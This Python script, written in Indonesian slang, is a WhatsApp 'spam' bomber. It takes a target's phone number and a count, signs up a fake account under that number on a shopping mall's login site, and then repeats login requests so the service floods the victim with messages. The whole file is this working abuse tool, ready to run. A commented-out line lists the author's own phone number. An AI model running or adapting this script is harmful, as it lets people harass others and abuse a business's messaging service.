import os
try:import requests as req
except ModuleNotFoundError:os.system("python -m pip install requests");os.system("python run.py")
class spam:
	def __init__(self,nom,jumlah):
		self.nom,self.jumlah,self.ngontol=nom,jumlah,0
		self.url="https://tasya.tunjunganplaza.com/login/"
		self.headers={"Host":"tasya.tunjunganplaza.com","Connection":"keep-alive","User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; ASUS_I003DD Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"}
		self.data_login={"whatsapp":self.nom,"password":"Aap Afandi Ganteng Pisan","rememberme":"0"}
		self.data_daftar={"firstname":"Aap","lastname":"Ganteng","email":"awokawokawok@gmail.com","pgcard":None,"password":"Aap Afandi Ganteng Pisan","whatsapp":self.nom}
	def otw(self):
		try:
			a=req.post(self.url+"auth",headers=self.headers,data=self.data_daftar).text
			if "Nomor Whatsapp Sudah Terdaftar" in a:
				for x in range(self.jumlah):
					self.ngontol+=1
					b=req.post(self.url+"in",headers=self.headers,data=self.data_login).text
					if "Success" in b: print(f"\x1b[1;32m[{str(self.ngontol)}] Sukses Terkirim Ke {self.nom}")
					else: print(f"\x1b[1;31m[{str(self.ngontol)}] Gagal Terkirim Ke {self.nom}")
			elif "Proses Registrasi Berhasil" in a:
				c=req.post(self.url+"auth",headers=self.headers,data=self.data_daftar).text
				if "Nomor Whatsapp Sudah Terdaftar" in c:
					for x in range(self.jumlah):
						self.ngontol+=1
						d=req.post(self.url+"in",headers=self.headers,data=self.data_login).text
						if "Success" in d: print(f"\x1b[1;32m[{str(self.ngontol)}] Sukses Terkirim Ke {self.nom}")
						else: print(f"\x1b[1;31m[{str(self.ngontol)}] Gagal Terkirim Ke {self.nom}")
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("\x1b[1;31m[!] Kesalahan Pada Koneksi")
def logo():
	os.system("clear")
	print("""\x1b[36m
           ╔═╗┌─┐┌─┐┌┬┐   ╦ ╦┌─┐
           ╚═╗├─┘├─┤│││───║║║├─┤
           ╚═╝┴  ┴ ┴┴ ┴   ╚╩╝┴ ┴
       \x1b[1;30;107m-=[ Create By Kang Pacman ]=-\x1b[0m
""")
if __name__=="__main__":
	logo()
	print("\x1b[1;35m[*] Example : 628xxx\n")
	while True:
		nomer=input("\x1b[1;37m[?] Nomer Target : ")
		if nomer in(""," "): print("\x1b[1;31m[!] Jangan Kosong Ajg!!")
		elif nomer.isalpha(): print("\x1b[1;31m[!] Jangan Pake Huruf Ajg!!")
		elif "62" not in nomer[:2]: print(f"\x1b[1;31m[!] Melek Dong Tolol, Pake Awalan 62 Bukan {nomer[:2]}")
		#elif nomer in("6283805812588","+6283805812588","083805812588","83805812588","+62 838-0581-2588","62 838-0581-2588"): print("\x1b[1;31m[!] Jangan Ke Nomer Gua Doang Asu!")
		else:
			try:
				no=int(nomer)
				jumlah=int(input("\x1b[1;37m[?] Jumlah : "))
				spam(no,jumlah).otw();break
			except ValueError: exit("[!] Isi Yang Bener Ajg")